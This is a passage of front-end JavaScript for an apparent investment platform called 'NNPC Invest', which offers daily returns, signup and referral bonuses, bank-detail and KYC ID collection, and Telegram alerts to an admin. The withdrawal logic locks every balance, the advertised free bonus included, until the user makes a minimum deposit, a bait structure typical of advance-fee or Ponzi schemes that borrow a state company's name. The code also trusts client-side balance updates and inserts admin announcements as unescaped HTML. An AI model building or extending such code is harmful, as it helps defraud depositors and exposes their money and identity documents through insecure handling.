  showToast("Now upload your payment receipt below", "info");
};

// ============================================================
//  WITHDRAWAL
// ============================================================
window.openWithdrawModal = function() {
  if (!userData) return;

  const minPlan = PLANS[0]; // Starter plan — minimum deposit required

  const bonusBal    = userData.bonusBalance    || 0;
  const referralBal = userData.referralBalance || 0;
  const earnsBal    = userData.earningsBalance  || 0;
  const elapsed     = userData.planDaysElapsed  || 0;
  const canWithdrawEarnings = elapsed >= WITHDRAW_DELAY_DAYS;

  // ── RULE: no withdrawals of ANY kind until the user has made their first deposit.
  // Once depositMade = true, ALL balances unlock:
  //   • signup bonus    → immediately
  //   • referral bonus  → immediately (referrer already deposited before their referee joined)
  //   • earnings        → after Day 2 of active plan
  if (!userData.depositMade) {
    document.getElementById("withdraw-bonus-row").style.display = "none";
    const refRow = document.getElementById("withdraw-referral-row");
    if (refRow) refRow.style.display = "none";
    document.getElementById("withdraw-earnings-row").style.display = "none";
    document.getElementById("withdraw-balance-val").textContent = fmt(0);
    document.getElementById("withdraw-lock-notice").style.display = "flex";
    document.getElementById("withdraw-lock-notice").innerHTML =
      `<span>🔒</span><span>You must make your first deposit of at least ${fmt(minPlan.amount)} (${minPlan.name} Plan) before you can withdraw any funds — including your signup bonus and any referral bonuses.</span>`;
    document.getElementById("withdraw-form-fields").style.display = "none";
    openModal("modal-withdraw");
    return;
  }

  // User has deposited — calculate what's available
  const available = bonusBal + referralBal + (canWithdrawEarnings ? earnsBal : 0);

  // Merge signup bonus + referral bonus into a single "Bonus & Referral" row.
  // This avoids depending on a separate withdraw-referral-row HTML element.
  const combinedBonusLabel = referralBal > 0
    ? `${fmt(bonusBal)} bonus + ${fmt(referralBal)} referral`
    : fmt(bonusBal);
  document.getElementById("withdraw-bonus-row").style.display = (bonusBal + referralBal) > 0 ? "flex" : "none";
  document.getElementById("withdraw-bonus-val").textContent   = combinedBonusLabel;

  // Optional referral row — hide if it exists; we show it merged above
  const refRow = document.getElementById("withdraw-referral-row");
  if (refRow) refRow.style.display = "none";

  document.getElementById("withdraw-earnings-row").style.display = "flex";
  document.getElementById("withdraw-earnings-val").textContent = canWithdrawEarnings
    ? fmt(earnsBal)
    : `${fmt(earnsBal)} (unlocks Day 2)`;
  document.getElementById("withdraw-balance-val").textContent = fmt(available);

  if (available <= 0) {
    document.getElementById("withdraw-lock-notice").style.display = "flex";
    document.getElementById("withdraw-lock-notice").innerHTML = elapsed < WITHDRAW_DELAY_DAYS && userData.activePlan
      ? `<span>⏳</span><span>Your plan earnings unlock after Day ${WITHDRAW_DELAY_DAYS}. You are on Day ${elapsed}.</span>`
      : `<span>ℹ️</span><span>No funds available to withdraw yet.</span>`;
    document.getElementById("withdraw-form-fields").style.display = "none";
  } else {
    document.getElementById("withdraw-lock-notice").style.display = "none";
    document.getElementById("withdraw-form-fields").style.display = "block";
    if (userData.bankAccount) {
      document.getElementById("wd-account-number").value = userData.bankAccount;
      document.getElementById("wd-bank-name").value      = userData.bankName || "";
      document.getElementById("wd-account-name").value   = userData.accountName || "";
    }
  }
  openModal("modal-withdraw");
};

document.getElementById("btn-submit-withdraw")?.addEventListener("click", async () => {
  const amount  = parseFloat(document.getElementById("wd-amount").value);
  const accNum  = document.getElementById("wd-account-number").value.trim();
  const bank    = document.getElementById("wd-bank-name").value.trim();
  const accName = document.getElementById("wd-account-name").value.trim();

  // Hard guard — no withdrawals before first deposit
  if (!userData?.depositMade) {
    return showToast("Make your first deposit (min. ₦4,000 Starter Plan) to unlock withdrawals", "error");
  }

  const referralBal = userData?.referralBalance || 0;
  const bonusBal    = userData?.bonusBalance    || 0;
  const earnsBal    = userData?.earningsBalance  || 0;
  const elapsed     = userData?.planDaysElapsed  || 0;
  const canWithdrawEarnings = elapsed >= WITHDRAW_DELAY_DAYS;

  // After first deposit: bonus + referral immediately available; earnings after Day 2
  const available = bonusBal + referralBal + (canWithdrawEarnings ? earnsBal : 0);

  if (!amount || amount < 500)      return showToast("Minimum withdrawal is ₦500", "error");
  if (amount > available)            return showToast("Insufficient available balance", "error");
  if (!accNum || !bank || !accName)  return showToast("Fill all bank details", "error");

  // Deduct: referral first → bonus → earnings
  let remaining = amount;
  const deductReferral = Math.min(remaining, referralBal);                        remaining -= deductReferral;
  const deductBonus    = Math.min(remaining, bonusBal);                           remaining -= deductBonus;
  const deductEarnings = Math.min(remaining, canWithdrawEarnings ? earnsBal : 0);

  setLoading("btn-submit-withdraw", true, "Request Withdrawal");
  try {
    const uid = currentUser.uid;
    await updateDoc(doc(db, "users", uid), {
      bankAccount: accNum, bankName: bank, accountName: accName,
      ...(deductReferral > 0 ? { referralBalance: increment(-deductReferral) } : {}),
      ...(deductBonus    > 0 ? { bonusBalance:    increment(-deductBonus)    } : {}),
      ...(deductEarnings > 0 ? { earningsBalance: increment(-deductEarnings) } : {})
    });

    await addDoc(collection(db, "withdrawals"), {
      uid, userName: userData.fullName, userEmail: userData.email,
      phone: userData.phone || "",
      amount, accNum, bank, accName,
      status: "pending", createdAt: serverTimestamp()
    });

    await addDoc(collection(db, "transactions"), {
      uid, type: "withdraw", amount,
      description: `Withdrawal to ${bank} (${accNum})`,
      status: "pending", createdAt: serverTimestamp()
    });

    // Notify admin on Telegram
    await sendTelegramAlert(
      `💸 <b>Withdrawal Request</b>\n👤 ${userData.fullName}\n📱 ${userData.phone || "N/A"}\n💰 ₦${amount.toLocaleString()}\n🏦 ${bank}\n🔢 ${accNum}\n📋 ${accName}`
    );

    closeModal("modal-withdraw");
    showToast("Withdrawal request submitted! Admin will process it within 24 hrs.", "success");
  } catch (err) {
    showToast(err.message, "error");
  }
  setLoading("btn-submit-withdraw", false, "Request Withdrawal");
});

// ============================================================
//  PROFILE
// ============================================================
function renderProfile() {
  if (!userData) return;
  const name = userData.fullName || "Investor";
  document.getElementById("profile-name").textContent = name;
  document.getElementById("profile-email-text").textContent = userData.email || "";
  document.getElementById("profile-ref-code").textContent = userData.referralCode || "";
  document.getElementById("profile-avatar-big").textContent = name[0].toUpperCase();
  document.getElementById("profile-phone-text").textContent = userData.phone || "Not set";
  document.getElementById("profile-kyc-status").textContent = userData.kycStatus === "verified" ? "✓ Verified" : "Pending";
}

// ============================================================
//  ACCOUNT UPDATE MODAL
// ============================================================
window.openAccountModal = function() {
  document.getElementById("acc-fullname").value = userData?.fullName || "";
  document.getElementById("acc-phone").value = userData?.phone || "";
  document.getElementById("acc-bank").value = userData?.bankName || "";
  document.getElementById("acc-account-number").value = userData?.bankAccount || "";
  document.getElementById("acc-account-name").value = userData?.accountName || "";
  openModal("modal-account");
};

document.getElementById("btn-save-account")?.addEventListener("click", async () => {
  const fullName = document.getElementById("acc-fullname").value.trim();
  const phone    = document.getElementById("acc-phone").value.trim();
  const bankName = document.getElementById("acc-bank").value.trim();
  const bankAccount = document.getElementById("acc-account-number").value.trim();
  const accountName = document.getElementById("acc-account-name").value.trim();

  if (!fullName) return showToast("Name is required", "error");

  setLoading("btn-save-account", true, "Save Changes");
  try {
    await updateDoc(doc(db, "users", currentUser.uid), {
      fullName, phone, bankName, bankAccount, accountName
    });
    await updateProfile(currentUser, { displayName: fullName });
    closeModal("modal-account");
    showToast("Profile updated successfully", "success");
  } catch (err) {
    showToast(err.message, "error");
  }
  setLoading("btn-save-account", false, "Save Changes");
});

// ============================================================
//  REFERRAL TAB
// ============================================================
window.renderReferralTab = async function() {
  if (!userData || !currentUser) return;
  const ref  = userData.referralCode || "";
  const link = `${window.location.origin}${window.location.pathname}?ref=${ref}`;
  document.getElementById("ref-tab-link").textContent       = link;
  document.getElementById("ref-tab-bonus-bal").textContent  = fmt(userData.referralBalance || 0);

  try {
    const snap = await getDocs(query(collection(db, "users"), where("referredBy", "==", currentUser.uid)));
    document.getElementById("ref-tab-count").textContent    = snap.size;
    document.getElementById("ref-tab-earnings").textContent = fmt(snap.size * 2000);
  } catch (_) {}
};

window.copyRefLinkTab = function() {
  const text = document.getElementById("ref-tab-link")?.textContent || "";
  navigator.clipboard.writeText(text).then(() => showToast("Referral link copied!", "success"));
};

window.shareRefLinkTab = function() {
  const text = document.getElementById("ref-tab-link")?.textContent || "";
  const msg  = `Earn daily returns on NNPC projects! Join with my link and get a free ₦2,000 bonus: ${text}`;
  if (navigator.share) {
    navigator.share({ title: "NNPC Invest", text: msg, url: text });
  } else {
    window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, "_blank");
  }
};

window.joinTelegram = function() {
  window.open(`https://t.me/${TELEGRAM_BOT_USERNAME}`, "_blank");
  closeModal("modal-telegram-prompt");
};

// Legacy aliases (used in old modal-referral HTML)
window.copyRefLink  = window.copyRefLinkTab;
window.shareRefLink = window.shareRefLinkTab;

// ============================================================
//  KYC
// ============================================================
let kycFileUrl = null;

document.getElementById("kyc-upload-area")?.addEventListener("click", () => {
  document.getElementById("kyc-file-input").click();
});

document.getElementById("kyc-file-input")?.addEventListener("change", async e => {
  const file = e.target.files[0];
  if (!file) return;
  const url = await uploadToCloudinary(file);
  if (url) {
    kycFileUrl = url;
    document.getElementById("file-preview-kyc").classList.add("show");
    document.getElementById("file-preview-kyc-name").textContent = file.name;
    showToast("Document uploaded", "success");
  }
});

document.getElementById("btn-submit-kyc")?.addEventListener("click", async () => {
  if (!kycFileUrl) return showToast("Please upload your ID document", "error");
  setLoading("btn-submit-kyc", true, "Submit KYC");
  try {
    await updateDoc(doc(db, "users", currentUser.uid), { kycStatus: "pending", kycDoc: kycFileUrl });
    await addDoc(collection(db, "kyc"), {
      uid: currentUser.uid, userName: userData.fullName,
      docUrl: kycFileUrl, status: "pending", createdAt: serverTimestamp()
    });
    closeModal("modal-kyc");
    showToast("KYC submitted! Under review.", "success");
  } catch (err) {
    showToast(err.message, "error");
  }
  setLoading("btn-submit-kyc", false, "Submit KYC");
});

// ============================================================
//  ANNOUNCEMENTS
// ============================================================
async function loadAnnouncements() {
  // Client-side sort — avoids Firestore composite index requirement
  const snap = await getDocs(collection(db, "announcements"));
  const list = snap.docs.map(d => d.data())
    .sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0))
    .slice(0, 5);
  const container = document.getElementById("announce-list");
  if (!container) return;
  if (list.length === 0) {
    container.innerHTML = '<div class="empty-state"><div class="empty-icon">📢</div><div class="empty-title">No announcements</div></div>';
    return;
  }
  container.innerHTML = list.map(a => `
    <div class="announce-banner" style="margin-bottom:12px">
      <div class="announce-icon">📢</div>
      <div>
        <div class="announce-title">${a.title}</div>
        <div class="announce-text">${a.message}</div>
        <div style="font-size:11px;color:var(--muted);margin-top:6px">${relativeTime(a.createdAt)}</div>
      </div>
    </div>
  `).join('');
}

// ============================================================
//  LOGOUT
// ============================================================
window.logout = async function() {
  if (!confirm("Sign out of your account?")) return;
  if (unsubscribeSnapshot) unsubscribeSnapshot();
  await signOut(auth);
  showScreen("screen-login");
};

// ============================================================
//  SHOW PASSWORD TOGGLE
// ============================================================
document.querySelectorAll(".toggle-pw").forEach(btn => {
  btn.addEventListener("click", () => {
    const input = btn.previousElementSibling || btn.closest(".input-wrap").querySelector("input");
    input.type = input.type === "password" ? "text" : "password";
    btn.textContent = input.type === "password" ? "👁️" : "🙈";
  });
});

// ============================================================
//  BOTTOM NAV
// ============================================================
document.querySelectorAll(".nav-item").forEach(item => {
  item.addEventListener("click", () => {
    const tab = item.dataset.tab;
    showTab(tab);
    if (tab === "plans")    renderPlans();
    if (tab === "projects") renderProjects();
    if (tab === "profile")  renderProfile();
    if (tab === "referral") renderReferralTab();
    if (tab === "calc") {
      const select = document.getElementById("calc-plan");
      if (select && !select.children.length) {
        PLANS.forEach(p => {
          const opt = document.createElement("option");
          opt.value = p.id;
          opt.textContent = `${p.name} (₦${p.amount.toLocaleString()})`;
          select.appendChild(opt);
        });
      }
    }
  });
});

// ============================================================
//  CLOSE MODALS (backdrop click)
// ============================================================
document.querySelectorAll(".modal-overlay").forEach(overlay => {
  overlay.addEventListener("click", e => {
    if (e.target === overlay) {
      overlay.classList.remove("open");
      if (overlay.id === "modal-payment") clearInterval(paymentTimer);
    }
  });
});

// ============================================================
//  CHECK REFERRAL CODE IN URL
// ============================================================
(function checkRefUrl() {
  const params = new URLSearchParams(window.location.search);
  const ref = params.get("ref");
  if (ref) {
    const refInput = document.getElementById("reg-ref");
    if (refInput) refInput.value = ref;
  }
})();

// ============================================================
//  INIT
// ============================================================
(function init() {
  renderOnboarding();
  document.getElementById("full-loader").style.display = "flex";
  // Auth state listener handles everything else
})();
